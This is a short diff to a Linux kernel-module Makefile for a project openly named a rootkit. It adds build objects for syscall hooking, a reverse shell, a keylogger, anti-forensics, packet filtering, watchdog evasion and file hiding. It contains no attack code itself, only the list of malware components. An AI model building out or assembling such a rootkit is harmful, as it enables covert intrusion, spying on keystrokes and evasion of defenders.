@@ -14,7 +14,14 @@ rootkit-objs := \
 	src/directory_encrypt.o \
 	src/process_hiding.o \
 	src/module_hiding.o \
-	src/socket_hiding.o
+	src/socket_hiding.o \
+	src/syscall_hook.o \
+	src/reverse_shell.o \
+	src/keylogger.o \
+	src/anti_forensics.o \
+	src/packet_filter.o \
+	src/anti_watchdog.o \
+	src/vfs_file_hiding.o
 
 KDIR := /lib/modules/$(shell uname -r)/build
 PWD := $(shell pwd)
